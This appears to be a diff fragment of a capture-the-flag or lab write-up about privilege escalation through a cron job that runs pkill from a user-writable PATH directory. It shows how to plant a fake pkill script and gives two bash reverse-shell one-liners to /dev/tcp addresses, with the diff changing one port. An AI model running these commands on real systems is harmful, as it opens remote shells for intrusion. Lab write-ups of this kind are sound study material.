@@ -50,7 +50,7 @@ PATH=/home/lachlan/bin:/bin:/usr/bin
 
 pkill command not triggering from the path variable. so we can create fake pkill script in username/bin dir and it will triger in every minute.  edit pkill in home/user/bin like this
 
-[bash -c 'bash -i >& /dev/tcp/10.8.0.247/4444 0>&1']
+[bash -c 'bash -i >& /dev/tcp/10.8.0.247/4422 0>&1']
 
 [bash -c 'exec bash -i &>/dev/tcp/10.4.41.28/5555 <&1']
 
